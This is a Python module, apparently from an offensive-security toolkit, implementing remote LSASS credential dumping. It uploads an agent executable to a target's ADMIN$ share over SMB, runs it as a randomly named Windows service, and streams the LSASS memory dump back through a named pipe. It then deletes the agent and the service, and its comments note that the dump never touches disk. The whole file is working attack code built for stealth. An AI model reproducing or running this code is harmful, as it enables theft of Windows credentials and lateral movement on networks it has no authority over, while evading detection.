"""Dump methods — strategies to extract LSASS memory from a remote target.

PipeDump: upload native agent, stream LSASS via named pipe, self-deletes.
"""

import secrets
import string
import time
import threading

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl


def random_name(length: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


class PipeDump:
    """Native agent dump: indirect syscalls, dump streamed via named pipe.

    Agent is uploaded to ADMIN$/Temp, executed as a service, then self-deletes.
    The dump data never touches disk — it streams through a named pipe.
    """

    name = "pipe"

    def __init__(self, session: SmbSession, agent_path: str):
        self.session = session
        self.agent_path = agent_path

    def execute(self, lsass_pid: int | None = None) -> bytes:
        if lsass_pid is None:
            lsass_pid = self._find_lsass_pid()

        pipe_name = random_name(12)
        svc_name = random_name(10)
        agent_name = f"{random_name()}.exe"

        # Upload agent
        self._upload_agent(agent_name)
        binary_path = f"C:\\Windows\\Temp\\{agent_name} {lsass_pid} {pipe_name}"

        # Start service in background
        t = threading.Thread(target=self._exec_via_service, args=(svc_name, binary_path), daemon=True)
        t.start()

        # Read dump from pipe
        try:
            dump_data = self._read_pipe_with_retry(pipe_name, timeout=30)
        finally:
            t.join(timeout=10)
            try:
                self.session.delete_file("ADMIN$", f"Temp\\{agent_name}")
            except Exception:
                pass

        if not dump_data or dump_data[:4] != b"MDMP":
            raise RuntimeError("Received data is not a valid minidump")

        return dump_data

    def _find_lsass_pid(self) -> int:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.create_service(
                service_name=svc_name,
                display_name=svc_name,
                binary_path=cmd,
            )
            try:
                svc.start_service(svc_handle)
            except RuntimeError:
                pass
            try:
                svc.delete_service(svc_handle)
            except RuntimeError:
                pass
            svc.close_handle(svc_handle)

    def _upload_agent(self, agent_name: str) -> None:
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask, ImpersonationLevel,
        )

        with open(self.agent_path, "rb") as f:
            agent_data = f.read()

        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{agent_name}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(agent_data):
            chunk = agent_data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

    def _read_pipe_with_retry(self, pipe_name: str, timeout: int = 30) -> bytes:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                with self.session.open_pipe(pipe_name) as pipe:
                    chunks = []
                    while True:
                        try:
                            chunk = pipe.read(65536)
                            if not chunk:
                                break
                            chunks.append(chunk)
                        except Exception:
                            break
                    return b"".join(chunks)
            except Exception:
                time.sleep(1)

        raise RuntimeError(f"Timeout connecting to agent pipe '{pipe_name}'")
